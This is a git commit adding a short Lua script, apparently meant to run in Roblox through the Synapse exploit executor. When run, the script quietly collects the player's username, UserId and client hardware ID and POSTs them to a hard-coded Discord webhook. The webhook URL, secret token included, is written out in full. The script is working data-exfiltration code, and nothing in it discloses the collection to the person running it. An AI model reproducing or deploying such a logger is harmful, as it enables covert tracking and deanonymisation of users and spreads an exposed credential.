fc2e62e652dd7fd8ed56a7d0c002196f952cc150
Farleyy <94583502+Farleyy@users.noreply.github.com>
2023-01-27 00:31:00 -0600

    Create 9872635876t87t1gruy12tg89r7159tr87915489071.lua

---
+++ 9872635876t87t1gruy12tg89r7159tr87915489071.lua
@@ -0,0 +1,28 @@
+local h = game.HttpService
+local webUrl = "https://discord.com/api/webhooks/1068414186926903338/jcMA2OPbKOfGWF-tAIX1ejO-X5UWrfsM4VX576rFy8TeCIMB7NaxMfDN06yreNKo3buE"
+
+local responce = syn.request(
+{
+   Url = webUrl,
+   Method = "POST",
+   Headers = {
+       ['Content-Type'] = 'application/json'
+   },
+   Body = h:JSONEncode({
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "**Warning**",
+           ["description"] = game.Players.LocalPlayer.Name.." or "..game.Players.LocalPlayer.Name.." UserId: "..game.Players.LocalPlayer.UserId,
+           ["type"] = "rich",
+           ["color"] = tonumber(0xd40e0e),
+           ["fields"] = {
+               {
+                   ["name"] = "Hardware ID:",
+                   ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                   ["inline"] = true
+               }
+           }
+           
+       }}
+   })
+})
